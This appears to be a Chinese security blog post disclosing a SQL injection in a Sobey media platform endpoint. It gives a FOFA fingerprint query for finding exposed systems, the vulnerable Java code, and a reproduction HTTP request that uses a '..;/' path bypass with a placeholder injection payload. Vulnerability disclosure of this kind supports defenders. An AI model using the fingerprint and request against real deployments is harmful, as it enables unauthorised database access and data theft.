---
title: "索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/queryEditorScoreRank SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-jztEditorScore-queryEditorScoreRank-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchjzteditorscorequeryeditorscorerank-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/queryEditorScoreRank SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/18 08:30
* 550浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

漏洞修复方案

漏洞扫描服务

Web安全课程


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/jztEditorScore/queryEditorScoreRank 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/jztEditorScore/queryEditorScoreRank`的实现逻辑

```
@RequestMapping(
    value = {"/queryEditorScoreRank"},
    method = {RequestMethod.GET}
)
public Response queryEditorScoreRank(@RequestParam(value = "createStartTime",required = false) String createStartTime, @RequestParam(value = "endStartTime",required = false) String endStartTime, @RequestParam(value = "pageSize",required = false,defaultValue = "10") Integer pageSize, @RequestParam(value = "pageIndex",required = false,defaultValue = "0") Integer pageIndex, @RequestParam(value = "userName",required = false) String userName, @RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam(value = "targetUserType",required = false) String targetUserType, HttpServletRequest request) {
    QueryBuilder qb = new QueryBuilder(" select sum(zcncommoneditorscore.score) editeScoreTotal, count(distinct a.id) num, zcncommoneditorscore.targetUserCode , zcncommoneditorscore.targetUserName , zcncommoneditorscore.prop1 organizationName from zcnarticle a");
    if (!StringUtils.isEmpty(targetUserType)) {
        qb.append(String.format(JztEditorScoreServiceImpl.innerJoinTargetTypeScoreSQL, targetUserType));
    } else {
        qb.append(JztEditorScoreServiceImpl.innerJoinScoreSQL);
    }
```

深入探索

计算机安全

防火墙软件

安全认证考试

参数`targetUserType`使用`String.format`格式化后，无任何过滤或校验处理，被直接拼接到qb这个sql语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /sobey-mchEditor/js/..;/mch/jztEditorScore/queryEditorScoreRank?siteCode=&targetUserType='SQLI_POC&token=&userCode=admin HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/queryEditorScoreRank SQL注入漏洞](images/img-001-9c4270a02225.webp)](https://image.mrxn.net/0051f454a6684a4a96b89e86cd9205d2.webp)

成功通过报错注入在响应回显数据库用户信息

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/queryEditorScoreRank SQL注入漏洞](https://mrxn.net/jswz/sobey-jztEditorScore-queryEditorScoreRank-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-jztEditorScore-queryEditorScoreRank-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-jztEditorScore-queryEditorScoreRank-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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